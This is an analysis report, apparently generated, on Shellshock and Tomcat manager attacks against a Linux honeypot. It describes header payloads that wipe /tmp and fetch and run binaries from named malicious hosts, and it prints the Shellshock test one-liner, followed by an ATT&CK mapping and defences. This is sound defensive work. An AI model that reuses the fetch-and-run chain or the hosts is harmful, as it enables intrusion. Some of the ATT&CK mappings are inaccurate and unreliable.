### Executive Summary of Attack

**Attack Details:**
- The Linux honeypot system has been targeted by a sophisticated multi-vector attack involving two source IP addresses, `192.227.146.253` and `123.99.201.37`.
- The attackers made specific HTTP requests attempting to exploit the Shellshock vulnerability and access the Apache Tomcat management interface.

**Methods Used:**
1. The attackers sent HTTP requests with headers designed to leverage the Shellshock vulnerability (CVE-2014-6271), using Bash environment variable exploitation to attempt remote command execution.
2. Malicious commands embedded within the HTTP requests aimed to download and execute malware from external sources (`houmen.linux22.cn` and `baojun.shop`), clear the `/tmp` directory, and establish command and control (C&C) communication.
3. The attack involved probing the `/manager/html` endpoint, likely attempting to exploit administrative dispositions within the Tomcat server.

**Goals of the Attack:**
1. **Unauthorized Remote Access:** To gain unauthorized access and control over the system by exploiting known vulnerabilities and administrative interfaces.
2. **System Compromise:** To perform arbitrary command execution leading to the installation of malware for establishing a persistent presence on the victim system.
3. **Establishing C&C:** To integrate the compromised system within a botnet infrastructure, as suggested by the association of one attacking IP with the Kaiji malware.
4. **Reconnaissance and Lateral Movement:** To potentially conduct further reconnaissance within the network for lateral movement and additional exploitation.

To prepare for the formal report, systems administrators and security teams should collect the indicators of compromise (IOCs) identified during the analysis, apply relevant security measures to protect systems from similar attack vectors, and track any security incidents linked to this attack profile.

# HTTP Sessions Analysis

Here's an analysis of the HTTP sessions in the context of the attack:

1. **Sessions to port 8080** with URI `/manager/html`:
   - **User-Agent:** Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)
   - **Host:** 54.67.87.80:8080 (External IP of the honeypot)
   - There were identical GET requests to the management interface of the server, which could signify an attempt to access administrative areas of the web server.

2. **Sessions to port 80** with attempted Shellshock exploit:
   - **User-Agent and Referrer Headers:** Contain a payload using the Shellshock vulnerability (`() { :; };`) to execute a series of commands.
   - **Commands Executed:**
     - Remove all files from `/tmp/`.
     - Download a file from a malicious URL to `/tmp/`.
     - Create a script `/tmp/Run.sh` with the downloaded file, mark it executable, and execute it.
     - Clear the `/tmp/Run.sh` script after execution.
   - **Malicious URLs Involved:**
     - `http://houmen.linux22.cn/houmen/linux223`
     - `http://baojun.shop/dt64`
   - **Downloaded Files to `/tmp/`:**
     - `China.Z-dukk`
     - `China.Z-gsub`
     - `China.Z-faqf`
   - **Host:** 54.67.87.80 (External IP of the honeypot)
   - These requests attempted to exploit the Shellshock vulnerability present in Bash to gain unauthorized access to the server and execute arbitrary code.

The attack sessions suggest that the attacker was attempting to gain access to administrative features and exploit known vulnerabilities to download and execute malicious scripts. This indicates a multi-vector attack strategy involving reconnaissance for vulnerable services as well as active exploitation.

The HTTP requests observed during the attack serve several functions that are indicative of the attacker's methodology and objectives:

1. **Attempted Access to Administrative Interfaces:**
   - The GET requests to `/manager/html` on port 8080 suggest that the attacker was attempting to gain access to administrative interfaces, possibly the Tomcat Server Manager GUI. This type of request is often associated with reconnaissance to discover unsecured admin interfaces that can be exploited further.

2. **Shellshock Exploit Attempts:**
   - The requests that contained the "User-Agent" and "Referrer" headers with the Shellshock vulnerability payload (`() { :; };`) function declaration are indicative of exploit attempts. Shellshock is a severe vulnerability that allows attackers to execute arbitrary code on a vulnerable system. In this context, the commands in the headers were intended to:
     - Remove all files from the `/tmp` directory, preparing a clean working environment.
     - Download potentially malicious binaries from specified hostnames.
     - Create a shell script (`/tmp/Run.sh`) that would execute the downloaded binaries, grant them execution permissions, and run them.
     - Clear traces by removing the Run.sh script after execution.

3. **Commands Embedded in HTTP Headers:**
   - The attacker embedded a series of shell commands within the HTTP headers in an attempt to exploit the Shellshock vulnerability. The attack vector involves manipulating the HTTP headers to pass commands to the server's Bash shell, which should have been interpreted only as text. Successful exploitation would result in the execution of the commands by the server.

4. **Use of Known Exploitable URLs:**
   - The embedded wget commands within the headers point to known malicious URLs that host the malware these attackers are attempting to distribute. These hostnames have been flagged as malicious in other OSINT sources, indicating they are part of the infrastructure being used for this cyberattack.

In the context of the attack, these HTTP requests were used to conduct reconnaissance for possible vulnerabilities, exploit those vulnerabilities to gain unauthorized access, and then install and execute malware to compromise the system further. They indicate a multi-staged attack designed to probe defenses, exploit weaknesses, and establish persistence or perform other malicious actions on compromised systems.

# Malware OSINT

Based on the available information and the functions I have access to, there is currently no unique malware hashes or URLs directly associated with the attack. However, we know the following based on the analysis of previous reports:

- **Malware Associated with 192.227.146.253:**
  The IP address was identified as a botnet command and control server and linked to the malware known as "Kaiji" according to ThreatFox data. Kaiji is typically an ELF malware targeting Linux systems, and the ThreatFox report associated it with a high confidence level.

- **Shellshock Exploit:**
  The HTTP sessions attempted to exploit the Shellshock vulnerability, which is a security bug in the Bash shell. The User-Agent headers in several HTTP requests contained a Bash function definition followed by commands, indicating an attempted Shellshock exploit. This type of attack can lead to unauthorized access and execution of arbitrary commands on vulnerable systems.

- **IOC References:**
  The following hosts were found in the malware samples or commands/HTTP requests:
    - `houmen.linux22.cn`
    - `baojun.shop`
  
  These hosts were part of the payload injected into the User-Agent and Referrer headers in the HTTP requests, indicating that they may be associated with malicious downloads or other nefarious activities.

- **Malpedia Link:**
  The malware "Kaiji" has a detailed entry on Malpedia, a resource that provides information about malware families, their behavior, and characteristics. It's a knowledgeable resource to understand the capabilities and risks associated with this malware.

In the absence of additional specific IOC or malware samples, a more comprehensive analysis would require seeking information assuming the presence of these indicators in the system and correlating them with the known characteristics of the Kaiji malware and the Shellshock exploit. Further details could be revealed through direct investigation of the given URLs or by examining files downloaded from these hostnames during the attack.

# Which vulnerability does the attack attempt to exploit?
During the attack, the following vulnerabilities were targeted:

1. **Shellshock (CVE-2014-6271):**
   - _Exploit Names from ExploitDB (Samples):_
     - "GNU bash 4.3.11 - Environment Variable dhclient"
     - "Apache mod_cgi - 'Shellshock' Remote Command Injection"
     - "PHP < 5.6.2 - 'Shellshock' Safe Mode / disable_functions Bypass / Command Injection"
   - The Shellshock vulnerability is a well-known vulnerability that affects the Unix Bash shell, allowing attackers to execute arbitrary commands through environment variables passed to a vulnerable system.

2. **Apache Tomcat Manager (No CVE Identified):**
   - _Exploit Names from ExploitDB (Samples):_
     - "Apache Tomcat Manager - Application Deployer (Authenticated) Code Execution (Metasploit)"
     - "Apache Tomcat 5.x/6.0.x - Directory Traversal"
   - The exploit attempts related to the Apache Tomcat Manager `/manager/html` path often involve uploading a malicious web application or exploiting directory traversal vulnerabilities to assume control over the web server.

Without specific CVE numbers for the Apache Tomcat exploits attempted, it's harder to pinpoint the exact vulnerabilities targeted; however, this suggests an attempt to exploit known weaknesses in the Tomcat administrative interface.

In the context of this attack, the exploit attempt using the Shellshock vulnerability is particularly noteworthy, as it is one of the most serious vulnerabilities that can lead to a complete system compromise if successfully exploited. The ExploitDB example exploits provided are based on Metasploit modules, which automate the exploitation process, making it easier for attackers to leverage these vulnerabilities.

ExploitDB Sample Code for Shellshock (CVE-2014-6271):
```bash
env x='() { :;}; echo vulnerable' bash -c 'echo hello'
```
This code demonstrates a test case for the Shellshock vulnerability, showing how arbitrary code could be executed on a vulnerable system. In the case of the HTTP requests observed, a similar technique was used in the User-Agent headers to deliver the exploit.

The references to `/manager/html` imply an attempt to leverage administrative access to potentially upload malicious deployments or traverse directories, which can also lead to significant security breaches.


# MITRE ATT&CK
The observed attack techniques can be classified within the MITRE ATT&CK framework as follows:

1. **Reconnaissance (TA0043):**
   - **Resource Development (TA0042):**
     - **Acquire Infrastructure (T1583):** The attackers might have acquired infrastructure such as servers or domains, as evident from the malicious IP addresses and hostnames used.
     - **Compromise Infrastructure (T1584):** Potentially compromising existing infrastructure to serve as C2 servers or as deployment sites for malicious payloads.

2. **Initial Access (TA0001):**
   - **Exploit Public-Facing Application (T1190):** By targeting the public-facing web application, the attacker used the Shellshock vulnerability and attempted to access the Tomcat Manager application.

3. **Execution (TA0002):**
   - **Command and Scripting Interpreter (T1059):** The use of bash shell commands passed via the Shellshock vulnerability for code execution.
     - **Bash (T1059.004):** Specifically, the Shellshock exploit abuses Bash to execute arbitrary commands.

4. **Persistence (TA0003):**
   - **Server Software Component (T1505):** Installation of malware, such as a botnet, to maintain persistence on the compromised web server.

5. **Privilege Escalation (TA0004):**
   - **Exploitation for Privilege Escalation (T1068):** Shellshock can potentially lead to privilege escalation if the service user has elevated permissions.

6. **Defense Evasion (TA0005):**
   - **Obfuscated Files or Information (T1027):** Encoding or obfuscating the attack in HTTP headers to evade detection.
   - **Modify Authentication Process (T1556):** Targeting login pages to access administrative interfaces without valid credentials.

7. **Credential Access (TA0006):**
   - **Brute Force (T1110):** Attempting to log in via `/manager/html` could involve password brute force attempts.

8. **Discovery (TA0007):**
   - **Software Discovery (T1518):** Querying the server for installed applications, like trying to access the Tomcat manager interface.

9. **Lateral Movement (TA0008):**
   - **Use of Alternate Authentication Material (T1078):** Using valid credentials to access different systems within the network after successful exploitation.

10. **Collection (TA0009):**
    - Not specifically observed, but information collection might occur after a successful breach.

11. **Command and Control (TA0011):**
    - **Non-Application Layer Protocol (T1095):** Utilizing non-standard protocols or channels for command and control of the compromised system, which could be inferred from the C2 server association with malware such as Kaiji.

12. **Exfiltration (TA0010) and Impact (TA0040):**
    - These tactics were not directly observed but could follow after successful compromise and control.

Using the MITRE ATT&CK framework allows defenders to understand and classify the observed attack techniques, which in turn helps in designing detection strategies and defensive measures against similar attacks in the future.

# What Is The Goal Of The Attack?
The goal of the attack, based on the observed activities and tactics, appears to be multi-faceted:

1. **Gaining Unauthorized Access:** The attackers were attempting to gain unauthorized access by exploiting the Shellshock vulnerability and probing for a known administrative interface (Tomcat Manager) which could be indicative of an attempt to gain administrative rights or deploy malicious web applications.

2. **System Compromise and Command Execution:** The Shellshock exploitation aimed to execute arbitrary commands on the system. Successful execution could have allowed the attackers to compromise the system, leading to further malicious activities.

3. **Installation of Malicious Payloads:** The inclusion of commands to download and execute files on the target system (`China.Z-*` files) from external hosts indicates an intent to install malicious software, such as a botnet agent or other malware. This could be for the purpose of establishing a foothold for long-term access and control.

4. **Establishing a Command and Control Channel:** One of the attacking IP addresses was associated with the Kaiji malware, which is known for botnet herding. This suggests an intention to bring the compromised system into a botnet infrastructure for ongoing control and coordination of the target.

5. **Destructive Activity or Resource Exploitation:** The removal of contents from the /tmp directory and the execution of arbitrary scripts could also be part of a strategy to either damage the system, hamper forensic analysis, or utilize the system's resources for activities such as distributed denial-of-service (DDoS) attacks, cryptocurrency mining, or further propagation of malware.

6. **Information Theft:** Although not directly observed in the provided data, attackers' general motives often include stealing sensitive data, which could be another goal of this attack once initial access is granted.

7. **Reconnaissance and Mapping:** The attempt to access the administrative interface could also be part of a broader reconnaissance effort to map out the network and identify additional exploitable systems and services.

In summary, the attackers seem to be focused on system intrusion, malware deployment, establishing a command and control infrastructure, and potentially causing disruption or theft of resources and information. The specific goals may vary based on the attackers' larger agenda and the opportunities they uncover during their attack.

# If The System Is Vulnerable, Would The Attack Will Be Successful?
If the system in question remains vulnerable to the exploits attempted by the attackers, then the likelihood of a successful attack is high, given the methods used:

1. **Shellshock Vulnerability (CVE-2014-6271):**
   - If the Bash shell on the system is a version susceptible to Shellshock and CGI scripts are running under the context of Bash, the system would be vulnerable to remote command execution. Since this vulnerability allows for arbitrary code execution, the attackers could potentially gain full control of the system.

2. **Tomcat Manager Interface Access:**
   - If the Apache Tomcat management interface is not properly secured (e.g., default credentials, weak passwords, or no authentication), attackers could deploy malicious applications or even alter existing web applications to establish backdoors or further compromise the system.

Given these threats, the magnitude of the attack's success would depend on the following factors:

- **Vulnerability of the service version:** If the versions of the Bash shell and Apache Tomcat are outdated and unpatched, they are likely vulnerable.
- **Configuration and hardening of the system:** A properly hardened system with restricted access and execution policies may impede the effective exploitation of these vulnerabilities, but configuration errors or oversight could lead to successful exploitation.
- **Extent of security controls:** Intrusion detection/prevention systems (IDS/IPS), web application firewalls (WAFs), and endpoint protection could detect or prevent some exploitation attempts, depending on their configurations.
- **Security practices in place:** Regular patch management, least privilege access control, network segmentation, and monitoring could significantly reduce the success rate of the attack.

Given the grave nature of the Shellshock vulnerability and potential weaknesses in the Tomcat Manager interface, system administrators should immediately apply the necessary patches, enforce strong authentication mechanisms, and conduct thorough security audits to mitigate these risks and prevent the success of such attacks.

# How Can A System Be Protected From This Attack?
To protect a system from this type of attack, several defensive measures can be implemented:

1. **Patching and Updates:**
   - Regularly update all software, including the operating system, Bash shell, web servers, applications, and plugins, to the latest versions to ensure that known vulnerabilities are patched. For the Bash Shellshock vulnerability, update to a version past CVE-2014-6271.

2. **Security Configuration:**
   - Harden server configurations to limit the attack surface, such as disabling unnecessary services, features, or web server modules.
   - Ensure that administrative interfaces like Tomcat Manager are not exposed to the public internet unless absolutely necessary, and use strong authentication and access controls.

3. **Access Control:**
   - Enforce the principle of least privilege, ensuring users and services only have access rights essential to their function.
   - Use strong, unique passwords, and consider implementing multi-factor authentication (MFA).

4. **Network Security:**
   - Employ firewalls to restrict incoming and outgoing traffic based on pre-defined security policies.
   - Segment the network to prevent lateral movement and contain potential breaches within isolated domains.

5. **Intrusion Detection and Prevention Systems:**
   - Set up IDS/IPS solutions to monitor network traffic and system behavior for signs of malicious activity and potential breaches.
   - Configure IDS/IPS to recognize and block known attack signatures and patterns.

6. **Web Application Firewall (WAF):**
   - Use a WAF to inspect incoming HTTP traffic for malicious payloads and block exploitation attempts before they reach web applications.

7. **Regular Backups and Incident Response Plan:**
   - Regularly backup critical data as part of a comprehensive disaster recovery plan.
   - Develop and maintain an incident response plan to address breaches if they occur.

8. **Security Monitoring and Alerting:**
   - Implement continuous monitoring for suspicious activities and have an alerting system in place to notify administrators of potential security events.

9. **User and Service Account Management:**
   - Periodically review and audit user accounts and service permissions to ensure no old or unused accounts pose a security risk.

10. **Employee Awareness and Training:**
    - Conduct regular security awareness training to help employees recognize and report potential security threats like phishing attempts.

11. **Adherence to Security Frameworks and Best Practices:**
    - Follow industry-standard security frameworks (such as NIST, CIS, and ISO/IEC 27001) and best practices for information security management.

By implementing these measures, a system can be significantly protected against the attack observed and other similar attacks. It's important to conduct regular security assessments and remain vigilant as part, of an ongoing security strategy.
